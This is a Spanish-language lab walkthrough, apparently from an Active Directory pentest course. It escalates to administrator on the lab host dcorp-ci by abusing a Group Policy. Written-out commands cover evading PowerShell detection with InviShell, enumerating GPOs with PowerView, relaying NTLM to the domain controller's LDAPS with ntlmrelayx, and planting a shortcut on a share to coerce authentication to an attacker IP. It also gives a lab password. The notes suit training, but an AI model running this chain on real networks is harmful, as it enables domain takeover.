
### Tareas
- [ ] Abusar de una Politica de grupo demasiado permisiva para obtener acceso de administrador en *dcorp-ci*

**Flag 9 Nombre del atributo de la directiva del grupo que se modifica**


## Abusar de una política de grupos
Primero deberemos de ejecutar *InviShell* para poder eludir las detecciones de PowerShell y poder ejecutar este de forma mas sigilosa
```shell
.\InviShell\RunWithRegistryNonAdmin.bat  
```

Y después podremos ejecutar *PowerView*
```shell
. .\PowerView.ps1 
```

### Enumeración de políticas vinculadas al equipo *DCORP-CI*
```shell
Get-DomainGPO -ComputerIdentity DCORP-CI
```

Viendo que pertenece a la política *DevOps*, para confirmar la existencia de esta política
```shell
Get-DomainGPO -Identity 'DevOps Policy'
```

A continuación necesitaremos ejecutar *ntlmrelayx* usando *WSL* para poder retrasmitir el servicio LDAP en el controlador de dominio
```shell
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.97 --http-port '80,8080' -i --no-smb-server
```

```ad-warning
*La contraseña es*
WSLToTh3Rescue!
```

Para obtener la IP del controlador del dominio deberemos de hacer ping a este
```shell
ping DOLLARCORP.MONEYCORP.LOCAL
```

Una vez ejecutado el comando desde la maquina de estudiante deberemos de establecer la autenticación en la maquina de estudiante y crear un oyente que se conecte al *ntlmrelayx*

Nos dirigiremos a *C:\AD\Tools* crearemos un nuevo *shortcut* y en la ubicación que pide para el acceso directo hay que poner el siguiente comando
```shell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.67' -UseDefaultCredentials"
```

Y guardarlo como *student97.lnk*
Este *shortcut* lo copiaremos en *\\\dcorp-ci\AI*
```shell
xcopy C:\AD\Tools\student97.lnk \\dcorp-ci\AI
```

Ahora lo ejecutaremos haciendo doble clic